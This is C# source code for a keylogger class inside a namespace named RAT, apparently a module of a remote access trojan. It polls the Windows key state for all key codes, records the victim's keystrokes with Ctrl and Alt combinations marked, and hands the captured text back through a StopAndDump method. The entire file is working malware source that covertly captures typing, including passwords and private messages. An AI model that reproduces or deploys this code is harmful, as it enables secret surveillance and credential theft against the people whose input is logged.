using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace RAT
{
    class KeyLogger
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        #region toggles
        static bool UsingModifier(Keys key) { return Convert.ToBoolean(GetAsyncKeyState((int)key) & 0x8000); }
        static bool ControlKey { get { return UsingModifier(Keys.ControlKey); } }
        static bool ShiftKey { get { return UsingModifier(Keys.ShiftKey); } }
        static bool CapsLock { get { return UsingModifier(Keys.CapsLock); } }
        static bool AltKey { get { return UsingModifier(Keys.Menu); } }
        #endregion


        StringBuilder Log = new StringBuilder();
        bool running = true;

        List<Keys> notLoggedKeys = new List<Keys>() {
                Keys.ShiftKey,   Keys.RShiftKey,    Keys.LShiftKey,
                Keys.ControlKey, Keys.RControlKey,  Keys.LControlKey,
                Keys.Menu,       Keys.RMenu,        Keys.LMenu,
                Keys.CapsLock
            };

        public void Start()
        {
            running = true;

            Dictionary<Keys, string> dict = new Dictionary<Keys, string>()
            {
                { Keys.Back, "{<<}" }, {Keys.Return,"{ENTER}" }, {Keys.Escape,"{ESC}" }
                //TODO: add more keys because all special characters have strange symbol
            };

            while (running)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    if (notLoggedKeys.Contains((Keys)i)) { continue; }

                    int state = GetAsyncKeyState(i);
                    bool keyPressed = state == 1 || state == -32767;
                    if (!keyPressed) { continue; }

                    string key = ((Keys)i).ToString();

                    if (dict.ContainsKey((Keys)i))
                    {
                        key = dict[(Keys)i];
                    }
                    else
                    {
                        if (!(CapsLock || ShiftKey))
                        {
                            key = key.ToLower();
                        }

                        if (ControlKey && AltKey)
                        {
                            key = "{CtrlAlt:" + key + ":}";
                        }
                        else if (ControlKey)
                        {
                            key = "{Ctrl:" + key + ":}";
                        }
                        else if (AltKey)
                        {
                            key = "{Alt:" + key + ":}";
                        }
                    }
                    Console.Write(key);
                    Log.Append(key);
                    break;
                }
            }
        }

        public string StopAndDump()
        {
            running = false;
            string capturedKeys = Log.ToString();
            Log.Clear();
            return capturedKeys;
        }
    }
}